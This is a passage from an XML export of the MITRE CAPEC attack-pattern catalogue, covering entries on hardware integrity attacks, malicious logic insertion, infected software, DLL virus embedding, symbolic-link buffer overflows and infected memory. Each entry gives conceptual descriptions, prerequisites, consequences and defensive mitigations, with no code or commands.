               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Perform appropriate bounds checking on all buffers.</Mitigation>
            <Mitigation>Design: Enforce principle of least privilege</Mitigation>
            <Mitigation>Design: Static code analysis</Mitigation>
            <Mitigation>Implementation: Execute program in less trusted process space environment, do not allow lower integrity processes to write to higher integrity processes</Mitigation>
            <Mitigation>Implementation: Keep software patched to ensure that known vulnerabilities are not available for attackers to target on host.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Binary files like music and video files are appended with additional data to cause buffer overflow on target systems. Because these files may be filled with otherwise popular content, the attacker has an excellent vector for wide distribution. There have been numerous cases, for example of malicious screen savers for sports teams that are distributed on the event of the team winning a championship.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="713"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="440" Name="Hardware Integrity Attack" Abstraction="Meta" Status="Stable">
         <Description>An adversary exploits a weakness in the system maintenance process and causes a change to be made to a technology, product, component, or sub-component or a new one installed during its deployed use at the victim location for the purpose of carrying out an attack.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>Influence over the deployed system at a victim location.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1200</Entry_ID>
               <Entry_Name>Hardware Additions</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, Examples-Instances, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Description, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Integrity Modification During Deployed Use</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="441" Name="Malicious Logic Insertion" Abstraction="Meta" Status="Stable">
         <Description>An adversary installs or adds malicious logic (also known as malware) into a seemingly benign component of a fielded system. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. With the proliferation of mass digital storage and inexpensive multimedia devices, Bluetooth and 802.11 support, new attack vectors for spreading malware are emerging for things we once thought of as innocuous greeting cards, picture frames, or digital projectors. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems and their components that are still under development and part of the supply chain.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>Access to the component currently deployed at a victim location.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Malicious Logic Inserted Into to Product</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="442" Name="Infected Software" Abstraction="Standard" Status="Stable">
         <Description>An adversary adds malicious logic, often in the form of a computer virus, to otherwise benign software. This logic is often hidden from the user of the software and works behind the scenes to achieve negative impacts. Many times, the malicious logic is inserted into empty space between legitimate code, and is then called when the software is executed. This pattern of attack focuses on software already fielded and used in operation as opposed to software that is still under development and part of the supply chain.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="441">
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Leverage anti-virus products to detect and quarantine software with known virus.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-387"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, Examples-Instances, References, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Malicious Logic Inserted Into Product Software</Previous_Entry_Name>
            <Previous_Entry_Name Date="2018-07-31">Malicious Logic Inserted Into To Product Software</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="443" Name="Malicious Logic Inserted Into Product Software by Authorized Developer" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses their privileged position within an authorized software development organization to inject malicious logic into a codebase or product. Supply chain attacks from approved or trusted developers are extremely difficult to detect as it is generally assumed the quality control and internal security measures of these organizations conform to best practices. In some cases the malicious logic is intentional, embedded by a disgruntled employee, programmer, or individual with an otherwise hidden agenda. In other cases, the integrity of the product is compromised by accident (e.g. by lapse in the internal security of the organization that results in a product becoming contaminated). In other cases, the developer embeds a backdoor into a product to serve some purpose, such as product support, but discovery of the backdoor results in its malicious use by adversaries.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to the software during the development phase.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-379"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="444" Name="Development Alteration" Abstraction="Standard" Status="Stable">
         <Description>An adversary modifies a technology, product, or component during its development to acheive a negative impact once the system is deployed. The goal of the adversary is to modify the system in such a way that the negative impact can be leveraged when the system is later deployed. Development alteration attacks may include attacks that insert malicious logic into the system's software, modify or replace hardware components, and other attacks which negatively impact the system during development. These attacks generally require insider access to modify source code or to tamper with hardware components. The product is then delivered to the user where the negative impact can be leveraged at a later time.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="438"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to the system during the development phase to alter and/or modify software and hardware components. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Alter Execution Logic</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Assess software and software components during development and prior to deployment to ensure that they function as intended and without any malicious functionality.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, References, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Malicious Logic Insertion into Product Software via Externally Manipulated Component</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="445" Name="Malicious Logic Insertion into Product Software via Configuration Management Manipulation" Abstraction="Detailed" Status="Stable">
         <Description>An adversary exploits a configuration management system so that malicious logic is inserted into a software products build, update or deployed environment. If an adversary can control the elements included in a product's configuration management for build they can potentially replace, modify or insert code files containing malicious logic. If an adversary can control elements of a product's ongoing operational configuration management baseline they can potentially force clients receiving updates from the system to install insecure software when receiving updates from the server. Configuration management servers operate on the basis of a client pool, instructing each client on which software to install. In some cases the configuration management server will automate the software installation process. A malicious insider or an adversary who has compromised the server can alter the software baseline that clients must install, allowing the adversary to compromise a large number of satellite machines using the configuration management system. If an adversary can control elements of a product's configuration management for its deployed environment they can potentially alter fundamental security properties of the system based on assumptions that secure configurations are in place.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.</Mitigation>
            <Mitigation>Leverage anti-virus products to detect and quarantine software with known virus.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-379"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="446" Name="Malicious Logic Insertion into Product Software via Inclusion of 3rd Party Component Dependency" Abstraction="Detailed" Status="Stable">
         <Description>An adversary conducts supply chain attacks by the inclusion of insecure 3rd party components into a technology, product, or code-base, possibly packaging a malicious driver or component along with the product before shipping it to the consumer or acquirer. The result is a window of opportunity for exploiting the product or software until the insecure component is discovered. This supply chain threat can result in the installation of software that introduces widespread security vulnerabilities within an organization. One example could be the inclusion of an exploitable DLL (Dynamic Link Library) included within an antivirus technology. Because software often depends upon a large number of interdependent libraries and components to be present, security holes can be introduced merely by installing COTS software that comes pre-packaged with the components required for it to operate.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to the software during the development phase. This access is often obtained via insider access to include the 3rd party component after deployment.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-379"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="447" Name="Design Alteration" Abstraction="Standard" Status="Stable">
         <Description>An adversary modifies the design of a technology, product, or component to acheive a negative impact once the system is deployed. In this type of attack, the goal of the adversary is to modify the design of the system, prior to development starting, in such a way that the negative impact can be leveraged when the system is later deployed. Design alteration attacks differ from development alteration attacks in that design alteration attacks take place prior to development and which then may or may not be developed by the adverary. Design alteration attacks include modifying system designs to degrade system performance, cause unexpected states or errors, and general design changes that may lead to additional vulnerabilities. These attacks generally require insider access to modify design documents, but they may also be spoofed via web communications. The product is then developed and delivered to the user where the negative impact can be leveraged at a later time.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="438"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to system design documentation prior to the development phase. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.</Prerequisite>
            <Prerequisite>Ability to forge web communications to deliver modified design documentation.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Alter Execution Logic</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Assess design documentation prior to development to ensure that they function as intended and without any malicious functionality.</Mitigation>
            <Mitigation>Ensure that design documentation is saved in a secure location and has proper access controls set in place to avoid unnecessary modification.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, References, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Malicious Logic Insertion into Product Software during Update</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="448" Name="Embed Virus into DLL" Abstraction="Detailed" Status="Stable">
         <Description>An adversary tampers with a DLL and embeds a computer virus into gaps between legitimate machine instructions. These gaps may be the result of compiler optimizations that pad memory blocks for performance gains. The embedded virus then attempts to infect any machine which interfaces with the product, and possibly steal private data or eavesdrop.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="442"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Leverage anti-virus products to detect and quarantine software with known virus.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">Malware Infection into Product Software</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="45" Name="Buffer Overflow via Symbolic Links" Abstraction="Detailed" Status="Draft">
         <Description>This type of attack leverages the use of symbolic links to cause buffer overflows. An attacker can try to create or manipulate a symbolic link file such that its contents result in out of bounds data. When the target software processes the symbolic link file, it could potentially overflow internal buffers with insufficient bounds checking.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker creates or modifies a symbolic link pointing to a resources (e.g., file, directory). The content of the symbolic link file includes out-of-bounds (e.g. excessive length) data.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>The target host consumes the data pointed to by the symbolic link file. The target host may either intentionally expect to read a symbolic link or it may be fooled by the replacement of the original resource and read the attackers' symbolic link.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>While consuming the data, the target host does not check for buffer boundary which can lead to a buffer overflow. If the content of the data is controlled by the attacker, this is an avenue for remote code execution.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The attacker can create symbolic link on the target host.</Prerequisite>
            <Prerequisite>The target host does not perform correct boundary checking while consuming data from a resources.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.</Skill>
            <Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>An attacker creating or modifying Symbolic links is a potential signal of attack in progress.</Indicator>
            <Indicator>An attacker deleting temporary files can also be a sign that the attacker is trying to replace legitimate resources with malicious ones.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Pay attention to the fact that the resource you read from can be a replaced by a Symbolic link. You can do a Symlink check before reading the file and decide that this is not a legitimate way of accessing the resource.</Mitigation>
            <Mitigation>Because Symlink can be modified by an attacker, make sure that the ones you read are located in protected directories.</Mitigation>
            <Mitigation>Pay attention to the resource pointed to by your symlink links (See attack pattern named "Forced Symlink race"), they can be replaced by malicious resources.</Mitigation>
            <Mitigation>Always check the size of the input data before copying to a buffer.</Mitigation>
            <Mitigation>Use a language or compiler that performs automatic bounds checking.</Mitigation>
            <Mitigation>Use an abstraction library to abstract away risky APIs. Not a complete solution.</Mitigation>
            <Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</Mitigation>
            <Mitigation>Use OS-level preventative functionality. Not a complete solution.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Overflow with Symbolic Links in EFTP Server</xhtml:div>
               <xhtml:p>The EFTP server has a buffer overflow that can be exploited if an attacker uploads a .lnk (link) file that contains more than 1,744 bytes. This is a classic example of an indirect buffer overflow. First the attacker uploads some content (the link file) and then the attacker causes the client consuming the data to be exploited. In this example, the ls command is exploited to compromise the server software.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="302"/>
            <Related_Weakness CWE_ID="118"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="680"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="452" Name="Infected Hardware" Abstraction="Standard" Status="Stable">
         <Description>An adversary inserts malicious logic into hardware, typically in the form of a computer virus or rootkit. This logic is often hidden from the user of the hardware and works behind the scenes to achieve negative impacts. This pattern of attack focuses on hardware already fielded and used in operation as opposed to hardware that is still under development and part of the supply chain.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="441">
               <Exclude_Related Exclude_ID="513"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to the hardware currently deployed at a victim location.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">Malicious Logic Insertion into Product Hardware</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="456" Name="Infected Memory" Abstraction="Standard" Status="Stable">
         <Description>An adversary inserts malicious logic into memory enabling them to achieve a negative impact. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems that are still under development and part of the supply chain.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="441">
               <Exclude_Related Exclude_ID="513"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Leverage anti-virus products to detect stop operations with known virus.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>A USB Memory stick has malicious logic inserted before shipping of the product allowing for infection of the host machine once inserted into the USB port.</Example>
            <Example>In 2007, approximately 1800 of Seagate's Maxtor Personal Storage 3200 drives were built under contract with an outside manufacturer and contained a virus that stole user passwords.</Example>
         </Example_Instances>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
